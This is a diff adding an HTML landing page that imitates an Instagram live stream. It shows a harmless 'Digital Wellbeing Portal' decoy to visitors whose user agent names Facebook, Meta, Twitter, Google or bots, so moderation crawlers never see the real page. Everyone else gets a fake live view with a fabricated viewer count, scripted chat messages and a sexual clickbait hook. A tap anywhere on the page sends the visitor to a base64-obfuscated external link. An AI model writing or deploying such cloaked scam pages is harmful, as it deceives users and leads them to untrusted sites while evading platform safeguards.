@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Instagram Live</title>
+    <style>
+        :root { --ig-red: #ff3040; --ig-gradient: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%); }
+        * { box-sizing: border-box; margin: 0; padding: 0; user-select: none; font-family: -apple-system, system-ui, sans-serif; }
+        body { background: #000; color: #fff; overflow: hidden; height: 100vh; }
+
+        /* SAFE PAGE */
+        #safe-page { display: block; background: #fff; color: #333; height: 100vh; padding: 50px 20px; text-align: center; }
+
+        /* LIVE UI */
+        #money-page { display: none; position: relative; height: 100vh; width: 100vw; max-width: 450px; margin: 0 auto; overflow: hidden; }
+        .video-bg { position: absolute; inset: 0; width: 100%; height: 100%; object-fit: cover; z-index: 1; background: #111; }
+        .overlay { position: absolute; inset: 0; z-index: 10; display: flex; flex-direction: column; background: linear-gradient(to bottom, rgba(0,0,0,0.4), transparent 30%, transparent 60%, rgba(0,0,0,0.8)); }
+
+        /* Header */
+        .header { padding: 12px 15px; display: flex; align-items: center; justify-content: space-between; }
+        .avatar-ring { width: 38px; height: 38px; border-radius: 50%; background: var(--ig-gradient); padding: 1.8px; }
+        .avatar-img { width: 100%; height: 100%; border-radius: 50%; border: 2px solid #000; object-fit: cover; }
+        .live-tag { background: var(--ig-red); padding: 1px 6px; border-radius: 3px; font-size: 10px; font-weight: 900; }
+        .v-count { background: rgba(0,0,0,0.5); padding: 1px 8px; border-radius: 4px; font-size: 11px; margin-left: 5px; min-width: 50px; text-align: center; }
+
+        /* Chat */
+        .footer { margin-top: auto; padding: 15px; }
+        #chat-list { max-height: 220px; overflow: hidden; display: flex; flex-direction: column; justify-content: flex-end; mask-image: linear-gradient(to top, black 80%, transparent 100%); margin-bottom: 12px; }
+        .msg-item { display: flex; align-items: center; gap: 10px; margin-bottom: 12px; animation: slideIn 0.3s; }
+        .msg-item img { width: 32px; height: 32px; border-radius: 50%; }
+        .msg-content b { font-size: 13px; font-weight: 700; margin-right: 5px; }
+        .msg-content span { font-size: 13px; color: rgba(255,255,255,0.9); }
+
+        .hook-box { font-size: 14px; font-weight: 700; margin-bottom: 15px; text-shadow: 1px 1px 8px #000; }
+        .input-fake { border: 1px solid rgba(255,255,255,0.5); border-radius: 30px; padding: 10px 18px; background: rgba(0,0,0,0.2); display: flex; justify-content: space-between; }
+
+        @keyframes slideIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+    </style>
+</head>
+<body oncontextmenu="return false;">
+
+    <div id="safe-page">
+        <h1>Digital Wellbeing Portal</h1>
+        <p>Understanding screen health for modern mobile users.</p>
+    </div>
+
+    <div id="money-page" onclick="goLink()">
+        <video class="video-bg" autoplay muted loop playsinline>
+            <source src="https://cdn.aceimg.com/eeb2d32af.mp4" type="video/mp4">
+        </video>
+        <div class="overlay">
+            <div class="header">
+                <div style="display:flex; align-items:center; gap:10px;">
+                    <div class="avatar-ring">
+                        <img src="https://ui-avatars.com" class="avatar-img">
+                    </div>
+                    <div>
+                        <div style="font-weight:700; font-size:13.5px;">exlusive_vidhub.play</div>
+                        <div style="display:flex; gap:5px; align-items:center;">
+                            <span class="live-tag">LIVE</span>
+                            <span class="v-count" id="v-count">11.1k</span>
+                        </div>
+                    </div>
+                </div>
+                <div style="font-size:24px;">✕</div>
+            </div>
+            <div class="footer">
+                <div id="chat-list"></div>
+                <div class="hook-box">😱 SHOCKING: Watch this before it's deleted! 🔞🔥</div>
+                <div class="input-fake"><span style="color:#ccc; font-size:14px;">Add a comment...</span><span>❤️</span></div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const link = "aHR0cHM6Ly9zZWVuaW1wbGllZGR1bXAuY29tL3UwaXp4N3RkdDI/a2V5PTJkYTkxYjlkMWY3OGFjNTZjNmFlNjRiMzQ3MjU4NjU1";
+        function goLink() { window.location.href = atob(link); }
+
+        function check() {
+            const bots = ['facebook','meta','twitter','bot','google'];
+            if(!bots.some(b => navigator.userAgent.toLowerCase().includes(b))) {
+                document.getElementById('safe-page').style.display='none';
+                document.getElementById('money-page').style.display='block';
+                start();
+            }
+        }
+
+        function start() {
+            const users = [
+                {n: "Alex", m: "Is this for real?? 😱"},
+                {n: "Sarah", m: "Speechless... wow"},
+                {n: "Jack", m: "Best live ever! 🙌"},
+                {n: "Jessica", m: "Hurry, link is up!"},
+                {n: "Mike", m: "Did anyone record that??"},
+                {n: "Mona", m: "Krass, ich bin geschockt!"}
+            ];
+
+            setInterval(() => {
+                const u = users[Math.floor(Math.random()*users.length)];
+                const box = document.getElementById('chat-list');
+                const div = document.createElement('div');
+                div.className = 'msg-item';
+                
+                // Menggunakan UI-Avatars yang 100% PASTI MUNCUL di semua browser
+                const avatarUrl = `https://ui-avatars.com{u.n}&background=random&color=fff&rounded=true&bold=true`;
+                
+                div.innerHTML = `<img src="${avatarUrl}"> <div class="msg-content"><b>${u.n.toLowerCase()}</b><span>${u.m}</span></div>`;
+                box.appendChild(div);
+                if(box.children.length > 5) box.removeChild(box.children[0]);
+            }, 2000);
+
+            let v = 24100;
+            setInterval(() => {
+                v += Math.floor(Math.random()*40)-15;
+                document.getElementById('v-count').innerText = (v/1000).toFixed(1) + 'k';
+            }, 1000);
+        }
+
+        window.onload = check;
+    </script>
+</body>
+</html>
